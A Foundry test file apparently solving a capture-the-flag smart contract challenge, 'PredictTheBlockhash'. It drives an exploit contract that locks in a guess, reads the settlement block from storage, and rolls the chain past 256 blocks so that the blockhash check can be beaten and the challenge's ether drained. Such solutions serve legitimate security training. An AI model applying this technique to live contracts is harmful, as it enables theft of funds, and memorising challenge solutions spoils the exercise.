// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
        console.log("blockNumber in Setup:", block.number); //1
    }

    function testExploit() public {
        // Set block number
        console.log("block.number:", block.number);
        uint256 blockNumber = block.number;
        console.log("blockNumber:", blockNumber);
        // To roll forward, add the number of blocks to -256,
        // Eg. roll forward 10 blocks: -256 + 10 = -246
        // vm.roll(blockNumber - 256);
        // console.log("blockNumber after roll", block.number);
        // Put your solution here
        exploitContract.lockInGuess{value: 1 ether}();
        bytes32 _settlementBlockNumber = vm.load(address(predictTheBlockhash), bytes32(uint256(2)));
        console.log("_settlementBlockNumber:", uint256(_settlementBlockNumber));
        vm.roll(block.number + 256 + uint256(_settlementBlockNumber));
        console.log("blockNumber Now:", block.number);
        exploitContract.attack();
        _checkSolved();
        assertEq(address(exploitContract).balance, 2 ether);
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
